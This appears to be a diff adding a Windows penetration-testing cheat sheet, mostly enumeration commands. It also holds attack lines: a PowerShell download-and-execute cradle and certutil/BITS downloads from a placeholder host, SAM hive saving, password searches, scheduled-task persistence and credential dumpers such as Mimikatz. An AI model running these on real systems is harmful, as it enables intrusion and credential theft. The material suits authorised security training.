@@ -1,1 +1,118 @@
-Windows One liners coming soon
+# Windows One-Liners for Cybersecurity
+
+## 🔍 System Enumeration
+whoami /priv                                      # Display user privileges
+whoami /groups                                    # Show user group memberships
+whoami /all                                       # Show all user information
+systeminfo                                        # Detailed system information
+wmic os get name,version                          # Get OS name and version
+wmic bios get serialnumber                        # Get BIOS serial number
+
+## 🌐 Network Commands
+netstat -ano                                      # View active connections with PIDs
+netstat -an | findstr LISTENING                   # Show listening ports
+ipconfig /all                                     # Show all network configuration
+route print                                       # Show routing table
+arp -a                                            # Show ARP table
+nslookup [domain]                                 # DNS lookup
+
+## 🔐 Privilege Escalation
+whoami /priv                                      # Check current privileges
+net user                                          # List local users
+net user [username]                               # Get user details
+net localgroup administrators                     # List administrators
+net group "Domain Admins" /domain                 # List domain admins (if domain)
+reg query HKLM /f password /t REG_SZ /s           # Search registry for passwords
+
+## 📁 File Operations
+dir /s /b                                         # List all files recursively
+dir /a:h /s                                       # Show hidden files
+type C:\Users\*\Desktop\*.txt                     # Read all txt files on desktops
+copy file1 file2                                  # Copy file
+move file1 file2                                  # Move file
+del file                                          # Delete file
+
+## 🐚 Command Execution
+cmd /c "command"                                  # Execute command
+powershell -Command "command"                     # Execute PowerShell command
+powershell -ExecutionPolicy Bypass -File script.ps1  # Run PowerShell script
+cmd /c "whoami && hostname"                       # Multiple commands
+
+## 🔍 Process & Service Enumeration
+tasklist /v                                       # List all processes with details
+tasklist /svc                                     # List processes with services
+sc query                                          # List all services
+sc query [servicename]                            # Query specific service
+wmic process get name,processid,commandline       # Get process details
+wmic service get name,startname,state             # Get service details
+
+## 📊 System Information
+hostname                                          # Get computer name
+ver                                               # Get Windows version
+echo %USERNAME%                                   # Get current username
+echo %COMPUTERNAME%                               # Get computer name
+echo %USERPROFILE%                                # Get user profile path
+echo %TEMP%                                       # Get temp directory
+
+## 🔧 Registry Operations
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # Check startup programs
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # Check user startup
+reg query HKLM /f "password" /t REG_SZ /s         # Search for passwords in registry
+reg query HKLM /f "admin" /t REG_SZ /s            # Search for admin references
+reg save HKLM\SAM sam.save                        # Save SAM hive
+
+## 📡 Network Scanning
+nmap -sC -sV [IP]                                # Basic nmap scan (if installed)
+telnet [IP] [PORT]                               # Test port connectivity
+Test-NetConnection [IP] -Port [PORT]             # PowerShell port test
+ping [IP] -n 4                                    # Ping with count
+
+## 🔍 Active Directory (if domain)
+net user /domain                                  # List domain users
+net group /domain                                 # List domain groups
+net group "Domain Admins" /domain                 # List domain admins
+dsquery user                                      # Query AD users
+dsquery computer                                  # Query AD computers
+gpresult /r                                       # Get group policy results
+
+## 🗂️ Data Exfiltration
+certutil -encode file encoded.txt                 # Base64 encode file
+certutil -decode encoded.txt decoded.txt          # Base64 decode file
+powershell -Command "[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('file'))"  # PowerShell base64
+findstr /s "password" *.*                         # Search for password in files
+findstr /s "admin" *.*                            # Search for admin in files
+
+## 🔧 File Permissions & Ownership
+icacls file                                       # Show file permissions
+takeown /f file                                   # Take ownership of file
+cacls file /e /p username:F                       # Grant full permissions
+attrib file                                       # Show file attributes
+attrib +h file                                    # Hide file
+attrib -h file                                    # Unhide file
+
+## 🚀 Quick Exploitation
+powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://[IP]/script.ps1')"  # Download and execute
+certutil -urlcache -split -f http://[IP]/file    # Download file using certutil
+bitsadmin /transfer job http://[IP]/file C:\temp\file  # Download using BITS
+wget http://[IP]/file -OutFile file               # PowerShell download
+
+## 🔍 Log Analysis
+wevtutil qe Security /c:10 /f:text               # Query security logs
+wevtutil qe System /c:10 /f:text                 # Query system logs
+wevtutil qe Application /c:10 /f:text            # Query application logs
+findstr /i "login" C:\Windows\System32\winevt\Logs\Security.evtx  # Search security logs
+
+## 🔧 System Manipulation
+echo data > file                                  # Write to file
+echo data >> file                                 # Append to file
+set variable=value                                # Set environment variable
+echo %variable%                                   # Display environment variable
+schtasks /query                                   # List scheduled tasks
+schtasks /create /tn task /tr "cmd.exe" /sc onstart  # Create scheduled task
+
+## 🛡️ Security Tools
+mimikatz.exe                                      # Run Mimikatz (if available)
+procdump.exe -ma process.exe dump.dmp             # Memory dump process
+wce.exe                                           # Windows Credential Editor
+pwdump.exe                                        # Dump password hashes
+fgdump.exe                                        # Dump password hashes
